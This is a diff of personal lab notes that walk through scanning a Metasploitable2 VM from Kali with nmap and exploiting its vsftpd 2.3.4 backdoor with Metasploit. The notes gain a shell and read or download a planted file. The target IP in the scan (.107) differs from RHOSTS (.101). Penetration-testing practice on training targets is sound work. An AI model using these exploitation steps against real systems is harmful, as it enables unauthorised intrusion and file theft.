@@ -1,32 +1,69 @@
 
-![[Pasted image 20250209200128.png]]
+# 2.1. Find the target and identify the vulnerability
 
-🔷 Step 7: Start Ethical Hacking!
-Example 1: Scan Metasploitable with Nmap
+Scan with Nmap from Kali to know the target IP on the network:
 
-From Kali, scan the target:
+```
+nmap -sn 192.168.56.0/24
+```
 
-nmap -sV -A 192.168.56.101
+![[Pasted image 20250211190103.png]]
 
-Example 2: Exploit with Metasploit
+Identify the ports opened and the services used by our target `192.168.56.107`. By default, nmap uses a `SYN scan`, which might be blocked by a firewall. Instead, try a `TCP Connect` scan:
 
-Start Metasploit in Kali:
+```
+nmap -sT 192.168.56.107
+```
 
+![[Pasted image 20250211190940.png]]
+
+We will explore the service version of the protocol `ftp` in the port 21:
+```
+nmap -sV -p 21 192.168.56.107
+```
+
+![[Pasted image 20250211191406.png]]
+
+We will try to find a vulnerability related to that service version in Metasploit. Run Metasploit in Kali:
+```
 msfconsole
+```
 
-Use a known exploit:
+```
+search vsftpd
+```
 
+![[Pasted image 20250211191707.png]]
+
+We know that there is an exploit for that protocol version. Let's exploit it!
+
+# 2.2. Exploit the vulnerability
+
+Select the exploit, set the parameters and check that all the options are correct:
+```
 use exploit/unix/ftp/vsftpd_234_backdoor
 set TARGET 0
 set RHOSTS 192.168.56.101
+options
+```
+
+![[Pasted image 20250209200128.png]]
+
+Exploit:
+```
 exploit
+```
 
+Now you should have a reverse shell with the target machine where you can navigate freely. If you want to use a more comfortable interface use:
 
-## Read files in the target machine
+```
+script /dev/null -c bash
+```
 
-In Metasploitable2:
+## 2.2.1. Read files from the target machine
 
-Create a txt file with the following content 
+In the target `Metasploitable2`, create the file `testfile.txt` with the following content:
+
 ```
 Super secret condifential content
 
@@ -35,20 +72,8 @@ pwd 123456789
 ```
 
 
-Read file from Kali linux
+Now you could read files from the attacker `Kali linux`:
+
 ![[Pasted image 20250209200514.png]]
 
 
-## Send and receive files from the target machine using FTP
-Send a file from Kali Linux
-
-
-# Download files using metaexploitable
-
-```
-download /home/msfadmin/testfile.txt /home/yisus/Desktop
-```
-
-problem:
-
-![[Pasted image 20250209204417.png]]
